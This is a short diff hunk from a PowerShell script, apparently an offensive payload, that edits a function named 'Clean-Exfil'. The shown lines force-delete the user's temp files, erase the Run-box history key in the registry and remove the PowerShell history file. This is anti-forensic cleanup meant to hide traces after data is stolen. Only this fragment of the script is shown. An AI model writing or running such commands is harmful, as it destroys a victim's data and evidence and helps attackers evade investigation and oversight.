@@ -68,7 +68,7 @@ function Clean-Exfil {
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f -ErrorAction SilentlyContinue
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
 
 # Delete powershell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
